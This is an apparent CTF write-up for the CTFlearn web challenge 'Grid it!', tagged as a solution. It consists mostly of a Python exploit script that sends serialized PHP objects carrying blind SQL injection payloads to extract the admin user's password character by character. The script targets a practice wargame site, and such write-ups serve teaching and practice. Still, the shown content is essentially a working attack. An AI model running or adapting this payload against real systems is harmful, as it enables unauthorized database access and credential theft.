---
title : "[WEB] Grid it! (풀이 봄)"
categories: [Wargame, CTFlearn]
tags: [Webhacking, CTFlearn, CTFlearn Webhacking, Blind SQL Injection, PHP Object injection]
---
...
for i in range(1,101):
	...
	chklen = 0
	sql_len = 143 if i < 10 else 144

	payload = {
		'action':'delete_point',
		'point':'O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'+str(sql_len)+':"0 or if((select length(bin(ascii(substr(password,'+str(i)+',1)))) from user where username="admin")=6,2535270,0)";}'
	}
	...
	for j in range(1,chklen+1):
		get_len = 147 if i < 10 else 148
		payload = {
			'action':'delete_point',
			'point':'O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'+str(get_len)+':"0 or if((select substr(bin(ascii(substr(password,'+str(i)+',1))),'+str(j)+',1) from user where username="admin")=1,2535270,0)";}'
		}
		requests.get(url, params=payload, headers=headers, cookies=cookies)
